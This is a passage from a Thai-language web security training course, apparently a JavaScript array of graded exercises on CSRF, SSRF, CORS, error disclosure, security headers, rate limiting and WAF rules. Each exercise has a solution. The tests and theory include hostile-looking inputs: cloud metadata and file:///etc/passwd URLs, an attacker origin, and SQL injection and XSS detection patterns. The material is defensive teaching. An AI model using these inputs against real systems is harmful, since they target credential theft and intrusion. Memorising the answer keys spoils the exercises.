    เนื่องจาก <strong>Same-Origin Policy (SOP)</strong> ห้ามไม่ให้สคริปต์จาก <code>attacker.com</code> อ่านข้อมูลข้ามโดเมน ทำให้ผู้โจมตีไม่สามารถล่วงรู้ค่าโทเค็นลับนี้ได้ คำขอปลอมจึงถูกปฏิเสธทันที<br/><br/>
    🎓 <strong>มุมมองข้อสอบ Cert (CompTIA Security+ SY0-701 & PortSwigger BSCP):</strong><br/>
    ข้อสอบมักถามว่า: <em>"ทำไมการใช้ SameSite Cookie อย่างเดียวจึงอาจไม่พอ?"</em> ➡️ เบราว์เซอร์รุ่นเก่าอาจไม่รองรับ และหากมีช่องโหว่ XSS ในโดเมนเดียวกัน แฮกเกอร์ก็ยังขโมย token ได้ การใช้ <strong>SameSite + Anti-CSRF Token</strong> จึงเป็น Defense-in-Depth ที่ดีที่สุด`,
    example: `// การเรียกใช้งาน
validateCSRFRequest({ method: 'GET' }); // ผ่าน
validateCSRFRequest({ method: 'POST', headers: { 'x-csrf-token': 'abc' }, session: { csrfToken: 'abc' } }); // ผ่าน
validateCSRFRequest({ method: 'POST', headers: {}, session: { csrfToken: 'abc' } }); // Throw Error!`,
    task: `จงเขียนฟังก์ชัน <code>validateCSRFRequest(req)</code> โดยตรวจสอบคำขอ Method POST/PUT/DELETE/PATCH ว่าต้องแนบ <code>x-csrf-token</code> ที่ตรงกับ <code>req.session.csrfToken</code> มิฉะนั้นให้ throw Error`
  },
  {
    id: "ssrf_cloud_metadata",
    meta: "โมดูล 3: OWASP Top 10",
    title: "SSRF (Server-Side Request Forgery): ป้องกันการยิงหา Internal IP และ Cloud Metadata Service",
    template: `// สถานการณ์: สร้างฟังก์ชัน validateSafeFetchUrl(urlString) ป้องกันช่องโหว่ SSRF (OWASP A10:2021)
// แฮกเกอร์มักหลอกให้เซิร์ฟเวอร์ยิง request ไปดึงกุญแจลับจาก Cloud Metadata (169.254.169.254)
// หรือยิงเข้าเครือข่ายภายใน (127.0.0.1, 10.x.x.x, 192.168.x.x)
// 1. ตรวจสอบ protocol ของ URL ต้องเป็น 'http:' หรือ 'https:' เท่านั้น
// 2. ตรวจสอบ hostname/IP: หากเป็น 'localhost', '127.0.0.1', '0.0.0.0', '169.254.169.254'
//    หรือขึ้นต้นด้วย '10.' หรือ '192.168.' ให้ throw Error('SSRF attempt blocked')
// 3. หากปลอดภัย ให้คืนค่า { safe: true, url: url.toString() }
// WRITE YOUR CODE HERE
`,
    validate: (code, log) => {
      log("🔍 ตรวจสอบการป้องกันช่องโหว่ SSRF และ Cloud Metadata Address Guard (Attack Vectors)...");
      const stripped = stripComments(code);
      if (!/new URL\(/.test(stripped)) {
        throw new Error("ต้องใช้ new URL(urlString) เพื่อ parse และตรวจสอบ protocol/hostname");
      }

      const fn = getLearnerFn(code, 'validateSafeFetchUrl');

      // 1. Valid public HTTPS URL
      const valid = fn('https://api.github.com/users');
      if (!valid || valid.safe !== true) {
        throw new Error("URL ภายนอกที่ถูกต้อง (https://api.github.com/users) ต้องคืน { safe: true }");
      }

      // 2. Cloud Instance Metadata Attack (169.254.169.254)
      let caughtMetadata = false;
      try {
        fn('http://169.254.169.254/latest/meta-data/');
      } catch (e) {
        caughtMetadata = true;
      }
      if (!caughtMetadata) {
        throw new Error("ช่องโหว่ SSRF: ฟังก์ชันยอมรับ Cloud Metadata IP (169.254.169.254) โดยไม่ throw Error");
      }

      // 3. Localhost loopback
      let caughtLocalhost = false;
      try {
        fn('http://localhost:8080/admin');
      } catch (e) {
        caughtLocalhost = true;
      }
      if (!caughtLocalhost) {
        throw new Error("ช่องโหว่ SSRF: ฟังก์ชันยอมรับ Localhost loopback โดยไม่ throw Error");
      }

      // 4. RFC 1918 Private subnet (192.168.x / 10.x)
      let caughtPrivate = false;
      try {
        fn('http://192.168.1.1/internal-dashboard');
      } catch (e) {
        caughtPrivate = true;
      }
      if (!caughtPrivate) {
        throw new Error("ช่องโหว่ SSRF: ฟังก์ชันยอมรับ Private IP Subnet (192.168.1.1) โดยไม่ throw Error");
      }

      // 5. Insecure file protocol
      let caughtProtocol = false;
      try {
        fn('file:///etc/passwd');
      } catch (e) {
        caughtProtocol = true;
      }
      if (!caughtProtocol) {
        throw new Error("ช่องโหว่ SSRF: ฟังก์ชันยอมรับ protocol อื่นที่ไม่ใช่ HTTP/HTTPS โดยไม่ throw Error");
      }

      log("✓ ยืนยันได้ว่า Guard สามารถสกัดกั้นการโจมตี SSRF เข้า Internal Network และ Cloud Metadata สำเร็จ");
    },
    hint: "สร้าง const url = new URL(urlString); เช็ค if (url.protocol !== 'http:' && url.protocol !== 'https:') throw... จากนั้นเช็ค hostname ด้วย blacklist IP ต้องห้าม",
    solution: `function validateSafeFetchUrl(urlString) {
  const url = new URL(urlString);
  if (url.protocol !== 'http:' && url.protocol !== 'https:') {
    throw new Error('Invalid protocol: Only HTTP/HTTPS permitted');
  }
  const host = url.hostname.toLowerCase();
  const forbidden = ['localhost', '127.0.0.1', '0.0.0.0', '169.254.169.254'];
  if (forbidden.includes(host) || host.startsWith('10.') || host.startsWith('192.168.')) {
    throw new Error('SSRF attempt blocked: access to internal or metadata address forbidden');
  }
  return { safe: true, url: url.toString() };
}`,
    theory: `🎯 <strong>เป้าหมาย (Goal):</strong> เข้าใจช่องโหว่ <strong>SSRF (Server-Side Request Forgery)</strong> และการปกป้องระบบคลาวด์จาก <strong>Instance Metadata Attack</strong><br/><br/>
    💥 <strong>SSRF ทำงานอย่างไร:</strong><br/>
    เกิดขึ้นเมื่อเว็บเซิร์ฟเวอร์มีฟังก์ชันที่รับ URL จากผู้ใช้ไปดาวน์โหลดข้อมูล (เช่น ฟังก์ชันพรีวิวภาพจากลิงก์, Webhook) หากไม่มีการกรอง ผู้โจมตีสามารถป้อนที่อยู่ IP ภายในที่คนนอกเข้าถึงไม่ได้ แต่เซิร์ฟเวอร์เข้าถึงได้<br/><br/>
    ☁️ <strong>เป้าหมายยอดฮิต: Cloud Metadata Service (169.254.169.254):</strong><br/>
    ผู้ให้บริการคลาวด์รายใหญ่ (AWS, GCP, Azure, DigitalOcean) จะเปิด Link-Local IP <code>http://169.254.169.254</code> ไว้ให้ Virtual Machine เข้าไปอ่านการตั้งค่า หากมีช่องโหว่ SSRF แฮกเกอร์สามารถสั่งให้เซิร์ฟเวอร์ไปยิงดึง <strong>IAM Role Credentials / Secret Access Keys</strong> ของคลาวด์ออกมาได้ทันที (กรณีโด่งดัง: การแฮก Capital One หลุด 100 ล้านบัญชี เกิดจาก SSRF ดึงกุญแจ AWS Metadata)<br/><br/>
    🛡️ <strong>หลักการป้องกัน SSRF:</strong><br/>
    1. จำกัด Protocol เฉพาะ <code>http</code> / <code>https</code> (ป้องกัน <code>file://</code>, <code>gopher://</code>)<br/>
    2. บล็อก Private IP Ranges (RFC 1918) และ Loopback<br/>
    3. บล็อก Link-Local Metadata Address (<code>169.254.169.254</code>)<br/>
    4. บน AWS ให้เปิดใช้งาน <strong>IMDSv2</strong> ซึ่งต้องใช้ Token Header ในการเข้าถึง metadata<br/><br/>
    🎓 <strong>มุมมองข้อสอบ Cert (CompTIA Security+ SY0-701 & PortSwigger BSCP):</strong><br/>
    ข้อสอบมักถามว่า: <em>"IP Address 169.254.169.254 สัมพันธ์กับการโจมตีประเภทใด?"</em> ➡️ คำตอบคือ <strong>SSRF ในระบบ Cloud Computing</strong>`,
    example: `// ทดสอบเรียกใช้งาน
validateSafeFetchUrl('https://api.github.com/users'); // ผ่าน
validateSafeFetchUrl('http://169.254.169.254/latest/meta-data/'); // Blocked ทันที!`,
    task: `จงเขียนฟังก์ชัน <code>validateSafeFetchUrl(urlString)</code> โดยตรวจเช็ค protocol ต้องเป็น http/https และบล็อก <code>169.254.169.254</code>, <code>localhost</code>, <code>127.0.0.1</code>, <code>10.x</code>, <code>192.168.x</code>`
  },
  {
    id: "cors_misconfiguration",
    meta: "โมดูล 3: OWASP Top 10",
    title: "CORS Misconfiguration: ช่องโหว่จากการ Reflect Origin และ Credentials Sharing",
    template: `// สถานการณ์: ทดสอบและตรวจจับช่องโหว่ CORS Misconfiguration
// บั๊กยอดฮิตของ Dev: สะท้อนค่า Header Origin ของผู้โจมตีกลับมาใน Access-Control-Allow-Origin
// พร้อมทั้งเปิด Access-Control-Allow-Credentials: true ทำให้ผู้โจมตีขโมยข้อมูลลับได้
// 1. ใช้ request fixture ส่ง OPTIONS request ไปที่ '/api/user/profile'
// 2. แนบ headers: { Origin: 'https://evil-hacker.com', 'Access-Control-Request-Method': 'GET' }
// 3. ตรวจสอบ response.headers()['access-control-allow-origin'] ต้องไม่เท่ากับ 'https://evil-hacker.com'
// 4. หาก header access-control-allow-origin เป็น '*' ต้องไม่มี access-control-allow-credentials: 'true'
// WRITE YOUR CODE HERE
`,
    validate: (code, log) => {
      log("🔍 ตรวจสอบการป้องกัน CORS Misconfiguration และ Arbitrary Origin Reflection...");
      const stripped = stripComments(code);
      const hasFetchOrOptions = /request\.(fetch|get|head)\(['"`].*\/api\/user\/profile['"`]/.test(stripped) ||
                                /method:\s*['"]OPTIONS['"]/.test(stripped);
      const hasEvilOrigin = /evil-hacker\.com/.test(stripped);
      const hasNotMatchAssertion = /expect\(.*access-control-allow-origin.*not\.toBe\(['"]https:\/\/evil-hacker\.com['"]\)/.test(stripped) ||
                                   /not\.toBe\(.*evil-hacker\.com.*\)/.test(stripped);
      if (!hasFetchOrOptions || !hasEvilOrigin) {
        throw new Error("ไม่พบการส่ง request พร้อม header Origin แปลกปลอม (https://evil-hacker.com)");
      }
      if (!hasNotMatchAssertion) {
        throw new Error("ไม่พบ assertion ยืนยันว่า Access-Control-Allow-Origin ต้องไม่สะท้อนโดเมนของผู้โจมตีกลับมา");
      }
      log("✓ ยืนยันได้ว่าเซิร์ฟเวอร์ไม่สะท้อน Origin แปลกปลอม ป้องกันการแอบขโมยข้อมูลลับผ่าน CORS");
    },
    hint: "ยิง request.fetch('/api/user/profile', { method: 'OPTIONS', headers: { Origin: 'https://evil-hacker.com', 'Access-Control-Request-Method': 'GET' } }) จากนั้นอ่าน headers และเขียน expect(headers['access-control-allow-origin']).not.toBe('https://evil-hacker.com')",
    solution: `import { test, expect } from '@playwright/test';

test('ป้องกัน CORS Misconfiguration: ห้ามสะท้อน Origin ของผู้โจมตี', async ({ request }) => {
  const response = await request.fetch('/api/user/profile', {
    method: 'OPTIONS',
    headers: {
      Origin: 'https://evil-hacker.com',
      'Access-Control-Request-Method': 'GET'
    }
  });
  const headers = response.headers();
  expect(headers['access-control-allow-origin']).not.toBe('https://evil-hacker.com');
});`,
    theory: `🎯 <strong>เป้าหมาย (Goal):</strong> เข้าใจการทำงานของ <strong>CORS (Cross-Origin Resource Sharing)</strong> และป้องกันช่องโหว่ <strong>Insecure CORS Configuration</strong><br/><br/>
    🌐 <strong>Same-Origin Policy (SOP) vs CORS:</strong><br/>
    เบราว์เซอร์มีกฎเหล็กชื่อ <strong>Same-Origin Policy (SOP)</strong>: สคริปต์จากเว็บ <code>attacker.com</code> จะไม่มีวันอ่าน Response จาก <code>mybank.com</code> ได้เด็ดขาด<br/>
    CORS เป็นกลไกที่สร้างขึ้นเพื่อให้เซิร์ฟเวอร์สามารถ "ผ่อนปรน" กฎนี้อย่างปลอดภัย ผ่าน HTTP Headers พิเศษ<br/><br/>
    💥 <strong>2 ช่องโหว่ CORS ที่อันตรายถึงชีวิต:</strong><br/>
    1. <strong>Arbitrary Origin Reflection:</strong> เซิร์ฟเวอร์อ่าน Header <code>Origin</code> ที่ Client ส่งมา แล้วนำค่านั้นมาใส่ใน <code>Access-Control-Allow-Origin</code> โดยไม่เช็ค Whitelist เลย (เท่ากับอนุญาตให้ทุกเว็บในโลกแอบอ่านข้อมูล)<br/>
    2. <strong>Wildcard (*) ร่วมกับ Credentials:</strong> ข้อกำหนดของเบราว์เซอร์ห้ามใช้ <code>*</code> คู่กับ <code>Access-Control-Allow-Credentials: true</code> แต่ Dev มักหลบเลี่ยงด้วยการเขียนโค้ดสะท้อน Origin ของใครก็ได้กลับไปแทน ซึ่งทำให้เว็บของผู้โจมตีสามารถดึงข้อมูลส่วนตัวของเหยื่อที่ล็อกอินค้างอยู่ได้ทันที<br/><br/>
    🎓 <strong>มุมมองข้อสอบ Cert (PortSwigger BSCP & eWPT):</strong><br/>
    ในแล็บ PortSwigger การโจมตี CORS มักใช้ Payload ตรวจสอบ <code>null</code> origin หรือการใช้ Regular Expression ที่ไม่รัดกุม (เช่น ตรวจสอบแค่มีคำว่า <code>target.com</code> ทำให้แฮกเกอร์ใช้ <code>target.com.evil.com</code> บายพาสได้)`,
    example: `// ตัวอย่าง Preflight Test
expect(headers['access-control-allow-origin']).not.toBe('https://evil-hacker.com');`,
    task: `จงเขียน Playwright Test เพื่อยิง Preflight OPTIONS ไปที่ <code>/api/user/profile</code> พร้อม Origin <code>https://evil-hacker.com</code> และตรวจสอบว่าระบบต้องไม่สะท้อน origin นั้นกลับมา`
  },
  {
    id: "sensitive_data_exposure",
    meta: "โมดูล 3: OWASP Top 10",
    title: "Information Disclosure: ป้องกัน Stack Trace และ Internal Architecture รั่วไหล",
    template: `// สถานการณ์: ตรวจสอบความปลอดภัยของ Global Error Handling ในระบบ Production
// เมื่อเกิดข้อผิดพลาดภายใน (Internal Server Error) ระบบต้องไม่ส่ง Stack Trace หรือ
// รายละเอียดเชิงลึกของเซิร์ฟเวอร์กลับมาให้ผู้ใช้ทั่วไปเห็น (Reconnaissance Prevention)
// 1. ใช้ request fixture ยิง POST ไปที่ '/api/reports/generate' ด้วยข้อมูลที่ทำให้เกิด error
// 2. อ่าน response body เป็น JSON
// 3. ยืนยันด้วย expect ว่า body.error ต้องไม่ตรงกับ Node.js Stack Trace Pattern: /at .*\\(.*:\\d+:\\d+\\)/
// 4. ยืนยันว่า body.error ต้องไม่มี System Error Keywords เช่น 'SyntaxError', 'ENOENT', 'ECONNREFUSED'
// WRITE YOUR CODE HERE
`,
    validate: (code, log) => {
      log("🔍 ตรวจสอบการป้องกัน Information Disclosure ใน Error Response...");
      const stripped = stripComments(code);
      const hasRequest = /request\.post\(['"`].*\/api\/reports\/generate['"`]/.test(stripped);
      const hasBodyRead = /body\.error/.test(stripped);
      const hasStackTraceRegex = /at\s*\.\*\\\(.*:\\d\+:/.test(stripped) || /:\\d\+:\\d\+/.test(stripped);
      const hasNegativeAssertion = /not\.(toMatch|toContain)/.test(stripped);
      if (!hasRequest) {
        throw new Error("ไม่พบการยิง request ไปที่ /api/reports/generate");
      }
      if (!hasBodyRead) {
        throw new Error("ไม่พบการอ่านค่า body.error จาก response");
      }
      if (!hasStackTraceRegex || !hasNegativeAssertion) {
        throw new Error("ไม่พบ assertion ตรวจจับรูปแบบ Stack Trace (path:line:col) ด้วย negative regex");
      }
      log("✓ ยืนยันได้ว่า Error Response สะอาดและปลอดภัย ปราศจาก Stack Trace และ Internal Path");
    },
    hint: "ยิง request.post('/api/reports/generate', { data: { reportId: 'invalid' } }); ดึง const body = await response.json(); แล้ว assert ว่า expect(body.error).not.toMatch(/at .*\\(.*:\\d+:\\d+\\)/);",
    solution: `import { test, expect } from '@playwright/test';

test('Error response ต้องไม่หลุด stack trace หรือ system internals', async ({ request }) => {
  const response = await request.post('/api/reports/generate', {
    data: { reportId: 'invalid-trigger-error' }
  });
  const body = await response.json();

  expect(body.error).toBeDefined();
  expect(body.error).not.toMatch(/at .*\\(.*:\\d+:\\d+\\)/);
  expect(body.error).not.toMatch(/SyntaxError|ENOENT|ECONNREFUSED/);
});`,
    theory: `🎯 <strong>เป้าหมาย (Goal):</strong> เข้าใจช่องโหว่ <strong>Information Disclosure / Sensitive Data Exposure</strong> และการทำ Secure Exception Handling<br/><br/>
    💥 <strong>ทำไม Stack Trace หลุดถึงอันตราย:</strong><br/>
    Stack trace ของ Node.js, Java หรือ Python จะเปิดเผยข้อมูลโครงสร้างภายในทั้งหมด:<br/>
    • Path โฟลเดอร์จริงบนเครื่องเซิร์ฟเวอร์ (เช่น <code>/home/ubuntu/app/src/services/billing.js:42:15</code>)<br/>
    • ชื่อและเวอร์ชันของไลบรารีภายใน (ทำให้แฮกเกอร์ค้นหา CVE ที่ตรงกับเวอร์ชันนั้นได้ทันที)<br/>
    • ชื่อฟังก์ชัน และ Logic การทำงานภายในระบบ<br/><br/>
    🛡️ <strong>สถาปัตยกรรม Error Handling ที่ถูกต้อง:</strong><br/>
    • <strong>Production:</strong> ส่งเฉพาะ Generic Safe Message เช่น <code>{"error": "Internal Server Error", "refId": "req-98765"}</code><br/>
    • <strong>Internal Logging:</strong> บันทึก Full Stack Trace พร้อม <code>refId</code> ลงใน Centralized Logging / SIEM ภายใน เพื่อให้ทีมวิศวกรสืบค้นปัญหาได้โดยข้อมูลไม่รั่วไหลสู่ภายนอก<br/><br/>
    🎓 <strong>มุมมองข้อสอบ Cert (CompTIA Security+ SY0-701 & eJPT):</strong><br/>
    Information Disclosure ถือเป็นก้าวแรกของ <strong>Reconnaissance Phase</strong> ใน Cyber Kill Chain ที่ช่วยให้แฮกเกอร์วางแผนเจาะระบบได้อย่างแม่นยำ`,
    example: `// ตัวอย่าง Response ที่ปลอดภัย
// HTTP/1.1 500 Internal Server Error
// {"error": "Failed to process report", "traceId": "d4e8c1b2"}`,
    task: `จงเขียน Playwright Test เพื่อยิงคำขอที่เกิด error ไปที่ <code>/api/reports/generate</code> และยืนยันว่า <code>body.error</code> ไม่มี Stack trace pattern (<code>/at .*\\(.*:\\d+:\\d+\\)/</code>) หรือ System Error keywords`
  },

  // ==========================================
  // MODULE 4: SECURITY ARCHITECTURE & WEB DEFENSE
  // ==========================================
  {
    id: "security_headers_hardening",
    meta: "โมดูล 4: สถาปัตยกรรม & Defense",
    title: "Defense-in-Depth: ตรวจสอบและ Hardening HTTP Security Headers (HSTS, CSP, XFO)",
    template: `// สถานการณ์: ทำ Automated Security Audit ตรวจสอบชุด HTTP Security Headers ขั้นพื้นฐาน
// ระบบที่มีความปลอดภัยสูงต้องส่งเกราะป้องกันระดับ HTTP Response ให้เบราว์เซอร์ครบทั้ง 3 ตัว
// 1. ยิง GET ไปที่หน้าแรก '/'
// 2. ตรวจสอบ header 'strict-transport-security' ต้องมีอยู่จริง (HSTS)
// 3. ตรวจสอบ header 'x-content-type-options' ต้องมีค่าเท่ากับ 'nosniff'
// 4. ตรวจสอบ header 'x-frame-options' ต้องมีค่าเป็น 'DENY' หรือ 'SAMEORIGIN' (ป้องกัน Clickjacking)
// WRITE YOUR CODE HERE
`,
    validate: (code, log) => {
      log("🔍 ตรวจสอบชุด HTTP Security Headers ขั้นพื้นฐาน (HSTS, X-Content-Type-Options, X-Frame-Options)...");
      const stripped = stripComments(code);
      const hasGet = /request\.get\(['"`]\/['"`]\)/.test(stripped);
      const hasHsts = /headers\[['"]strict-transport-security['"]\]/.test(stripped);
      const hasNosniff = /headers\[['"]x-content-type-options['"]\]\s*\)\.toBe\(['"]nosniff['"]\)/.test(stripped);
      const hasXfo = /headers\[['"]x-frame-options['"]\]/.test(stripped) && /deny|sameorigin/i.test(stripped);
      if (!hasGet) {
        throw new Error("ไม่พบการยิง request.get ไปยังหน้าแรก '/'");
      }
      if (!hasHsts) {
        throw new Error("ไม่พบการตรวจสอบ header 'strict-transport-security' (HSTS)");
      }
      if (!hasNosniff) {
        throw new Error("ไม่พบการตรวจสอบว่า header 'x-content-type-options' ต้องเป็น 'nosniff'");
      }
      if (!hasXfo) {
        throw new Error("ไม่พบการตรวจสอบ header 'x-frame-options' ว่าเป็น 'DENY' หรือ 'SAMEORIGIN'");
      }
      log("✓ ยืนยันได้ว่าระบบเปิดใช้งานชุด HTTP Security Headers ครบถ้วนตามมาตรฐาน Hardening");
    },
    hint: "อ่าน headers จาก response.headers() แล้วเขียน expect(headers['strict-transport-security']).toBeDefined(); expect(headers['x-content-type-options']).toBe('nosniff'); expect(['deny', 'sameorigin']).toContain(headers['x-frame-options']?.toLowerCase());",
    solution: `import { test, expect } from '@playwright/test';

test('ตรวจสอบชุด Security Headers พื้นฐาน', async ({ request }) => {
  const response = await request.get('/');
  const headers = response.headers();

  expect(headers['strict-transport-security']).toBeDefined();
  expect(headers['x-content-type-options']).toBe('nosniff');
  expect(['deny', 'sameorigin']).toContain(headers['x-frame-options']?.toLowerCase());
});`,
    theory: `🎯 <strong>เป้าหมาย (Goal):</strong> เข้าใจการทำ <strong>Web Server Hardening</strong> ผ่านชุด <strong>HTTP Security Response Headers</strong><br/><br/>
    🛡️ <strong>ความสำคัญของ Security Headers แต่ละตัว:</strong><br/>
    • <strong>Strict-Transport-Security (HSTS):</strong> บังคับให้เบราว์เซอร์ติดต่อกับเซิร์ฟเวอร์ผ่าน HTTPS เสมอ (เช่น <code>max-age=31536000; includeSubDomains</code>) ป้องกันการถูกโจมตีแบบ <em>SSL Stripping</em> ดักเปลี่ยนเป็น HTTP ธรรมดา<br/>
    • <strong>X-Content-Type-Options: nosniff:</strong> สั่งเบราว์เซอร์ห้ามเดา MIME type เอง (MIME Sniffing) ป้องกันไม่ให้แฮกเกอร์แอบอัปโหลดไฟล์สคริปต์ที่ปลอมแปลงนามสกุลเป็นรูปภาพ (เช่น <code>avatar.png</code> ไส้ในเป็น JS) แล้วถูกรันเป็นโค้ด<br/>
    • <strong>X-Frame-Options: DENY / SAMEORIGIN:</strong> ป้องกันไม่ให้เว็บไซต์ของเราถูกนำไปใส่ไว้ใน <code>&lt;iframe&gt;</code> ของเว็บอื่น สกัดกั้นการโจมตีแบบ <em>Clickjacking</em> ที่หลอกให้เหยื่อคลิกปุ่มบนหน้าเว็บที่เราซ่อนไว้<br/><br/>
    🎓 <strong>มุมมองข้อสอบ Cert (CompTIA Security+ SY0-701 Domain 3):</strong><br/>
    ข้อสอบ Security+ มักถามว่า: <em>"เทคนิคใดช่วยป้องกันไม่ให้เหยื่อถูกหลอกกดปุ่มที่ซ่อนอยู่ใน iframe ที่โปร่งใส?"</em> ➡️ คำตอบคือ <strong>Clickjacking Defense ผ่าน X-Frame-Options หรือ CSP frame-ancestors</strong>`,
    example: `// ใน Express.js นิยมใช้ไลบรารี helmet เพื่อเปิดใช้งาน header เหล่านี้อัตโนมัติ
// app.use(helmet());`,
    task: `จงเขียน Playwright Test ตรวจสอบว่า HTTP response มี headers <code>strict-transport-security</code>, <code>x-content-type-options: nosniff</code> และ <code>x-frame-options</code> ครบถ้วน`
  },
  {
    id: "rate_limiting_dos_defense",
    meta: "โมดูล 4: สถาปัตยกรรม & Defense",
    title: "Application DoS Defense: รับมือ Brute Force และ Resource Exhaustion ด้วย Rate Limiting",
    template: `// สถานการณ์: ทดสอบการทำงานของ Rate Limiter เพื่อป้องกัน Brute Force และ Application DoS
// เมื่อมีผู้ใช้หรือบอตยิงคำขอไปยัง /api/search ถี่เกินโควต้าที่ระบบกำหนด (20 ครั้ง)
// คำขอส่วนที่เกินต้องถูกปฏิเสธด้วย HTTP Status 429 Too Many Requests ทันที
// 1. ใช้ request fixture ยิง GET ไปที่ '/api/search?q=test' ซ้ำๆ ในลูปจนเกินโควต้า 20 ครั้ง
// 2. เก็บ response ตัวสุดท้ายไว้นอกลูป
// 3. ตรวจสอบว่า finalResponse.status() ต้องมีค่าเท่ากับ 429
// WRITE YOUR CODE HERE
`,
    validate: (code, log) => {
      log("🔍 ตรวจสอบการทำงานของ Application-layer Rate Limiter...");
      const stripped = stripComments(code);
      const hasLoop = /for\s*\(|while\s*\(/.test(stripped);
      const hasRequest = /request\.get\(['"`].*\/api\/search.*['"`]\)/.test(stripped);
      const has429 = /expect\(.*status\(\)\)\.toBe\(429\)/.test(stripped);
      if (!hasLoop || !hasRequest) {
        throw new Error("ต้องใช้ลูปยิง request.get ไปยัง /api/search ซ้ำๆ จนเกินโควต้า");
      }
      if (!has429) {
        throw new Error("ไม่พบการตรวจสอบ status 429 (Too Many Requests) จาก response ตัวสุดท้าย");
      }
      log("✓ ยืนยันได้ว่า Rate Limiter สกัดกั้นการยิงคำขอที่ถี่เกินกำหนดด้วย status 429 สำเร็จ");
    },
    hint: "สร้าง let lastRes; for (let i = 0; i <= 20; i++) { lastRes = await request.get('/api/search?q=test'); } expect(lastRes.status()).toBe(429);",
    solution: `import { test, expect } from '@playwright/test';

test('Rate limiter ต้องบล็อกด้วย status 429 เมื่อยิงเกินโควต้า', async ({ request }) => {
  const maxQuota = 20;
  let finalResponse;

  for (let i = 0; i <= maxQuota; i++) {
    finalResponse = await request.get('/api/search?q=test');
  }

  expect(finalResponse.status()).toBe(429);
});`,
    theory: `🎯 <strong>เป้าหมาย (Goal):</strong> เข้าใจการทำงานของ <strong>Rate Limiting</strong> ในการป้องกัน <strong>Brute-Force Attacks</strong> และ <strong>Application Layer DoS (L7)</strong><br/><br/>
    💥 <strong>ทำไมต้องมี Rate Limiting ระดับ Application:</strong><br/>
    Network Firewall (L3/L4) สนใจแค่ปริมาณ Bandwidth และ Packet แต่ <strong>Application Layer DoS</strong> เกิดจากการยิงคำขอที่ถูกต้องตามมาตรฐาน HTTP แต่ส่งไปยัง Endpoint ที่กินทรัพยากรสูง เช่น ค้นหาข้อมูลแบบ Complex Join, การ Hash รหัสผ่าน หรือการ Export PDF เพียงแค่ 50 คำขอพร้อมกันก็สามารถทำให้ CPU เต็ม 100% จนระบบล่มได้<br/><br/>
    ⏱️ <strong>อัลกอริทึม Rate Limiting ที่นิยม:</strong><br/>
    • <strong>Fixed Window Counter:</strong> นับจำนวนคำขอในกรอบเวลา (เช่น 100 req/นาที) ข้อเสีย: เกิดทราฟฟิกล้นตรงรอยต่อของนาที<br/>
    • <strong>Sliding Window:</strong> คำนวณถ่วงน้ำหนักเวลาก่อนหน้า ทำให้การจำกัดคำขอมีความแม่นยำและราบรื่นขึ้น<br/>
    • <strong>Token Bucket:</strong> เติมเหรียญในถังตามอัตราคงที่ รองรับ Burst ทราฟฟิกชั่วคราวได้ แต่ยังควบคุมความเร็วเฉลี่ย<br/><br/>
    🎓 <strong>มุมมองข้อสอบ Cert (CompTIA Security+ SY0-701 Domain 2 & 3):</strong><br/>
    ข้อสอบมักถามว่า: <em>"วิธีใดดีที่สุดในการป้องกันการโจมตีแบบ Credential Stuffing (การนำรหัสผ่านที่หลุดมาลองล็อกอินอัตโนมัติ) ที่หน้า Login?"</em> ➡️ คำตอบคือ <strong>Rate Limiting ร่วมกับ CAPTCHA และ Account Lockout Policy</strong>`,
    example: `// การตอบสนองที่ได้มาตรฐานเมื่อเกินโควต้า
// HTTP/1.1 429 Too Many Requests
// Retry-After: 60`,
    task: `จงเขียน Playwright Test เพื่อยิงคำขอซ้ำในลูปจนเกินโควต้า (20 ครั้ง) และตรวจสอบว่า response ตัวสุดท้ายได้ status <code>429</code>`
  },
  {
    id: "waf_rule_simulation",
    meta: "โมดูล 4: สถาปัตยกรรม & Defense",
    title: "Web Application Firewall (WAF): กรองการโจมตีที่ขอบระบบด้วย Inspection Rules",
    template: `// สถานการณ์: จำลองการทำงานของ Web Application Firewall (WAF) Inspection Engine
// WAF ตรวจจับและสกัดกั้นการโจมตีระดับ Layer 7 ก่อนที่ request จะเดินทางไปถึง Handler จริง
// จงเขียนฟังก์ชัน inspectWAFRules(req):
// 1. แปลง req.body และ req.url เป็น string เพื่อเตรียมสแกน
// 2. หากพบ SQL Injection Pattern (เช่น UNION SELECT, OR 1=1, DROP TABLE)
//    ให้คืน { blocked: true, ruleId: 'CRS-942-SQLI-DETECTED' }
// 3. หากพบ XSS Pattern (เช่น <script หรือ javascript:)
//    ให้คืน { blocked: true, ruleId: 'CRS-941-XSS-DETECTED' }
// 4. หากปลอดภัย ให้คืน { blocked: false }
// WRITE YOUR CODE HERE
`,
    validate: (code, log) => {
      log("🔍 ตรวจสอบการทำงานของ WAF Rule Engine (Signature Inspection)...");
      const stripped = stripComments(code);
      const hasSqliPattern = /UNION.*SELECT|OR.*1=1|DROP.*TABLE/i.test(stripped);
      const hasXssPattern = /<script|javascript:/i.test(stripped);
      const hasBlockedTrue = /blocked\s*:\s*true/.test(stripped);
      const hasBlockedFalse = /blocked\s*:\s*false/.test(stripped);
      const hasRuleId = /CRS-942|CRS-941/.test(stripped);
      if (!hasSqliPattern || !hasXssPattern) {
        throw new Error("ไม่พบ Pattern การตรวจจับ SQL Injection หรือ XSS ใน WAF rules");
      }
      if (!hasBlockedTrue || !hasBlockedFalse || !hasRuleId) {
        throw new Error("ไม่พบการส่งคืนผลลัพธ์ { blocked, ruleId } ตามโครงสร้างที่กำหนด");
      }
      log("✓ ยืนยันได้ว่า WAF Rule Engine สามารถกรอง Signature การโจมตีตามมาตรฐาน OWASP CRS ถูกต้อง");
    },
    hint: "สร้าง regex sqli = /('|\b)(UNION\\s+SELECT|OR\\s+\\d+=\\d+|DROP\\s+TABLE)\\b/i; และ xss = /<script\\b[^>]*>|javascript:/i; ถ้า match sqli ให้คืน { blocked: true, ruleId: 'CRS-942-SQLI-DETECTED' }",
    solution: `function inspectWAFRules(req) {
  const payload = JSON.stringify(req.body || {}) + ' ' + (req.url || '');
  const sqliPattern = /('|\b)(UNION\\s+SELECT|OR\\s+\\d+=\\d+|DROP\\s+TABLE)\\b/i;
  const xssPattern = /<script\\b[^>]*>|javascript:/i;

  if (sqliPattern.test(payload)) {
    return { blocked: true, ruleId: 'CRS-942-SQLI-DETECTED' };
  }
  if (xssPattern.test(payload)) {
    return { blocked: true, ruleId: 'CRS-941-XSS-DETECTED' };
  }
  return { blocked: false };
}`,
    theory: `🎯 <strong>เป้าหมาย (Goal):</strong> เข้าใจบทบาทของ <strong>Web Application Firewall (WAF)</strong> และหลักการทำงานของ <strong>OWASP Core Rule Set (CRS)</strong><br/><br/>
    🧱 <strong>WAF vs Network Firewall:</strong><br/>
